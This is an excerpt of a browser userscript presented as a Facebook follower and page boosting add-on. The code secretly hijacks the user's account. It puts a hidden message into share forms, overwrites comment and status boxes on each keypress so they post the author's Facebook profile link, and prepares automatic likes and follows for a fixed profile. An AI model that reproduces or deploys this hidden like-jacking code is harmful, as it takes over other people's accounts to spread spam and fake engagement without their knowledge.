// ==UserScript==
// @name           Facebook Abone Kasma & Sayfa Kasma Eklentisi
// @author         Facebook Abone Kasma & Sayfa Kasma Eklentisi
// @version        1.0
// @description    SercanDizayn
// @namespace      Facebook Abone Kasma & Sayfa Kasma Eklentisi
...
if (document.URL.indexOf("sharer.php") >= 0) {
    ...
    document.forms.item(0).innerHTML += "<input type='hidden' autocomplete='off' class='mentionsHidden' name='message' value='http://www.facebook.com/SercanCetin.Designer'>"; 
...
for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
    document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('http://www.facebook.com/SercanCetin.Designer ') < 0 && this.name == 'add_comment_text_text'){this.value = 'http://www.facebook.com/SercanCetin.Designer ';}");
}
document.addEventListener("click", function () {
    if (document.URL.indexOf("facebook.com/SercanCetin.Designer") >= 0 && document.URL.indexOf("sharer.php") < 0) {
        for (i = 0; i <= document.getElementById("mainbuttonspan").getElementsByTagName("input").length - 1; i++) {
            if (document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).value == "Beğen") {
                document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).id = "Begen"
            }
    ...
    for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
        document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('http://www.facebook.com/SercanCetin.Designer ') < 0 && this.name == 'add_comment_text_text' || this.name == 'xhpc_message_text' && this.value.indexOf('http://www.facebook.com/SercanCetin.Designer ') < 0){this.value = 'http://www.facebook.com/SercanCetin.Designer ';}");
    }
    ...
    var params = "profile_id=100003530980216";
    params += "&location=1";
